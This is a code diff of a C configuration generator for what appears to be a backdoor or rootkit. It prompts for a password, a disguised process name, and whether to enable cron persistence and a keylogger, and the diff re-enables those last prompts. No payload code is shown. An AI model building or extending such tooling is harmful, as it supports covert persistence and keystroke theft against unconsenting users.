@@ -23,6 +23,7 @@ int main(int argc, char *argv[]) {
     new.c_lflag &= ~(ECHO);
 
 	printf("#ifndef CONFIG_H\n");
+	printf("#define CONFIG_H\n");
 
 	// Get password
 	while (1) {
@@ -74,8 +75,7 @@ int main(int argc, char *argv[]) {
     	strcpy(input, PROCNAME);
 	else 
 		input[strlen(input) - 1] = '\0';
-	printf("#define PROCNAME \"%s\"\n", input);
-	//printf("#define PROCNAME \"%s\\0\"\n", input);
+	printf("#define PROCNAME \"%s\\0\"\n", input);
 
 	// Debug	
 	fprintf(stderr, "[*] Enable debuging information? [no]: "); 
@@ -90,7 +90,7 @@ int main(int argc, char *argv[]) {
 		fprintf(stderr, " => Debug disabled.\n");
 	}
 
-/*	// Cron
+	// Cron
 	fprintf(stderr, "[*] Enable cron? [yes]: "); 
 	fflush(stderr);
 	fgets(input, INPUTLENGTH, stdin);
@@ -115,7 +115,7 @@ int main(int argc, char *argv[]) {
 		printf("#define KEYLOGGER 0\n");
 		fprintf(stderr, " => Keylogger disabled.\n");
 	}
-*/
+
 	printf("#endif\n");
 
 	return 0;
